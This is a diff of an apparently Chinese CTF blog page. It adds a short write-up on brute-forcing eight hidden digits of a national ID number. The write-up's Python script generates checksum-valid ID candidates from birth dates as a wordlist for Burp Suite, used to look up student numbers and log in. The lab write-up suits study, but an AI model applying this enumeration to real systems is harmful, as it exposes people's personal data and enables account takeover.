@@ -114,7 +114,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 12.5px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.5px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.25px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 13.75px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 14.29px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -171,6 +171,71 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-身份信息爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF%E7%88%86%E7%A0%B4/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF%E7%88%86%E7%A0%B4/">
+        身份信息爆破
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="身份信息爆破"><a href="#身份信息爆破" class="headerlink" title="身份信息爆破"></a>身份信息爆破</h1><h2 id="题目破解"><a href="#题目破解" class="headerlink" title="题目破解"></a>题目破解</h2><p>通过看到界面，我们需要知道学生的学号及密码才能登陆</p>
+<p>而后我们看到录取信息及学生学籍信息查询系统，点击录取信息，我们可以得知学生的姓名及身份证的一部分信息，有8个数字隐藏</p>
+<p>通过点击学生学籍查询系统，我们可以知道只要输入学生的姓名及身份证就可以得到学生的学号</p>
+<p>因此通过这个思路，我们可以爆破这8个数字，而且我们还可以通过身份证的验证来排除一些错误的身份证号码，脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">card=[]</span><br><span class="line">for i in range(1990,2000):</span><br><span class="line">    for j in range(1,13):</span><br><span class="line">        for k in range(1,32):</span><br><span class="line">            if(int(j)&lt;=9):</span><br><span class="line">                month=&quot;0&quot;+str(j)</span><br><span class="line">            else:</span><br><span class="line">                month=str(j)</span><br><span class="line">            if(int(k)&lt;=9):</span><br><span class="line">                day=&quot;0&quot;+str(k)</span><br><span class="line">            else:</span><br><span class="line">                day=str(k)</span><br><span class="line">            a=&quot;621022&quot;+str(i)+str(month)+str(day)+&quot;5237&quot;</span><br><span class="line">            card.append(a)</span><br><span class="line"></span><br><span class="line">def check(c):</span><br><span class="line">    list1=[7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]</span><br><span class="line">    crc=[1,0,&#x27;X&#x27;,9,8,7,6,5,4,3,2]</span><br><span class="line">    ca=list(c)</span><br><span class="line">    sum1=0</span><br><span class="line">    num=int(len(ca))-1</span><br><span class="line">    for i in range(0,num):</span><br><span class="line">        sum1=sum1+int(ca[i])*int(list1[i])</span><br><span class="line">    sum1=sum1%11</span><br><span class="line">    if(str(ca[len(ca)-1])==str(crc[sum1])):</span><br><span class="line">        return 1</span><br><span class="line">    else:</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    f=open(&quot;result.txt&quot;,&quot;w&quot;)</span><br><span class="line">    for i in range(0,len(card)):</span><br><span class="line">        if(check(card[i])==1):</span><br><span class="line">            d=card[i]+&#x27;\n&#x27;</span><br><span class="line">            f.writelines(d)</span><br><span class="line">            f.flush()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过生成的字典，将其放在burpsuit中跑即可</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-[BJDCTF2020]Easy MD5(MD5漏洞)" class="article article-type-post" itemscope itemprop="blogPost">
   
